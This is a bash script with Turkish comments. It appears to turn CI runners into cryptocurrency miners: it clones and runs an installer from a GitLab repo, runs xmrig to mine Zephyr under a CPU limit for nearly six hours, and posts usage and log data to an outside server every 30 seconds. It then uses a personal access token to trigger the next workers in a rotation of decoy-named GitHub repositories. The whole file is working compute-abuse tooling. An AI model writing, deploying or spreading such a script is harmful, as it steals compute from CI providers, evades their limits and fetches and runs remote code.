#!/bin/bash

# --- 1. AYARLAR ---
WORKER_ID=${WORKER_ID:-1}
WORKER_NAME="PRIME_W_$WORKER_ID"
START_TIME=$SECONDS
API_URL="https://miysoft.com/miner/prime_api.php"
USER_NAME="tosunhalil924-lang"

# --- 2. KURULUM ---
sudo apt-get update && sudo apt-get install -y cpulimit curl jq git
git clone https://gitlab.com/paradoxsal/paradoxsal_miner_prime logic_module
cd logic_module

# Windows karakterlerini temizle (Her ihtimale karşı)
sed -i 's/\r//' zeph_install.sh
chmod +x zeph_install.sh
./zeph_install.sh

echo "### İZLEME BAŞLADI: $WORKER_NAME ###"

# --- 3. İZLEME DÖNGÜSÜ (5 SAAT 45 DK) ---
while [ $((SECONDS - START_TIME)) -lt 20700 ]; do
    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # Logları miner.log'dan çek
    if [ -f "miner.log" ]; then
        LOGS=$(tail -n 15 miner.log | base64 -w 0)
    else
        LOGS=$(echo "Log dosyası henüz oluşmadı" | base64 -w 0)
    fi
    
    # Miysoft'a Rapor Ver
    curl -s -X POST -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "{\"worker_id\":\"$WORKER_NAME\", \"cpu\":\"$CPU\", \"ram\":\"$RAM\", \"status\":\"MINING_ZEPH\", \"logs\":\"$LOGS\"}" \
         $API_URL || true
    
    # CPU Kısıtlaması (%70)
    PID=$(pgrep -f xmrig)
    if [ ! -z "$PID" ]; then
        sudo cpulimit -p $PID -l 140 & > /dev/null 2>&1
    fi

    sleep 30
done

# --- 4. DEVİR TESLİM (TRIGGER) ---
echo "Vardiya bitti, bayrak devrediliyor..."
case $WORKER_ID in
  1|2) N1=3; N2=4 ;;
  3|4) N1=5; N2=6 ;;
  5|6) N1=7; N2=8 ;;
  7|8) N1=1; N2=2 ;;
esac

REPOS=("Atlas-Core-System" "Helios-Data-Stream" "Icarus-Sync-Node" "Hermes-Relay-Point" "Ares-Flow-Control" "Zeus-Buffer-Cloud" "Apollo-Logic-Vault" "Athena-Task-Manager")

REPO1=${REPOS[$((N1-1))]}
REPO2=${REPOS[$((N2-1))]}

trigger() {
  curl -X POST -H "Authorization: token $PAT_TOKEN" \
       -H "Accept: application/vnd.github.v3+json" \
       "https://api.github.com/repos/$USER_NAME/$1/dispatches" \
       -d "{\"event_type\": \"prime_loop\", \"client_payload\": {\"worker_id\": \"$2\"}}"
}

trigger "$REPO1" "$N1"
trigger "$REPO2" "$N2"

sudo pkill -f xmrig
exit 0
